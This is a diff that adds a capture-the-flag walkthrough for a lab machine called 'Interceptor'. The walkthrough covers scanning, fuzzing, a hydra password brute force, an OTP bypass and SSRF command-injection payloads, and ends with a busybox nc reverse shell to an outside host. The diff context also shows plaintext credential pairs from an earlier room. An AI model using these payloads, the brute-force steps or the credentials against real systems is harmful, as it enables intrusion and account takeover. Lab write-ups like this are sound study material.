@@ -230,4 +230,76 @@ svc-drop:dropsofjupiter
 j.harris:DropsOfJupiter2026!
 ```
 
+# Interceptor
+```bash
+export IP=Target_IP
+#### Scanning
+fscan -h $IP -p 1-65535 ALL  ==> 22,80 Open here
+
+#### Web server Exploitation
+[SQL Injection] ==> Failed
+[Brute Force Credentials] ==> Failed
+
+[Directory Fuzzing]
+##### Fuzzing Extensions Save my Day!
+dirsearch -r -t 50  --deep-recursive --max-recursion-depth=3 -x 400,404  -u $URL -e bak,php,php.bak,config,php.config
+feroxbuster --url $URL -x php,txt,html,js,json,bak,php.bak,config,sh,pl,cgi  -t 50 -e 
+==> login.php.bak
+
+[Password File Generate]
+Hint :- MediaHub + Any Year
+Mediahub2020
+Mediahub2021
+Mediahub2022
+Mediahub2023
+Mediahub2024
+Mediahub2025
+Mediahub2026 
+
+[Credential Brute Force]
+hydra -l admin@mediahub -P Custom-password.txt -s 80  -f $TARGET  http-get  ==>MediaHub2026 Worked!
+
+[OPT Bypass]
+It Just Checked, if the OPT is varified or Not!
+Bypass ==> It using by Replace the Object and Put (is_verified=True)
+
+[Post Exploitation Over Website]
+##### File Upload bypass ==> Failed
+Tried many file bypass, with gif and so more. It didn't work..
+
+##### SSRF bypass ==> Pass
+Coming on this i Read Writeup About that, SSRF + Command Injection Into It.
+[Filters Bypass]
+http://127.0.0.1/ <-- If you Run this, probally Blocked.
+### Failed
+http://127.0.0.1;id
+http://127.0.0.1|id
+http://127.0.0.1&id
+http://127.0.0.1\nid  or http://127.0.0.1%0aid
+### Worked
+http://127.0.0.1`id`
+http://127.0.0.1$(id)
+
+[Command Injection Worked]
+http://127.0.0.1$(which busybox)
+http://127.0.0.1$(busybox nc 192.168.x.x 9001 -e bash)
+
+[Post Exploit]
+##### Database Extraction and Credentials
+mysql Running:-
+[mysql:3360]
+
+Config File:-
+[config.js]
+
+##### Root Unintened   <- Read from 0xb0b website!
+## 2026 Copy Fail Exploit
+root@interceptor:~# cd /root;ls
+snap
+root@interceptor:~# echo "0xmr was here...? Can you See Me my Website 0xmrsecurity.github.io" > tryhackme-Note.txt
+root@interceptor:~# cat tryhackme-Note.txt 
+0xmr was here...? Can you See Me my Website 0xmrsecurity.github.io
+```
+
+
 > I am keep updating all Challenge Writeups...
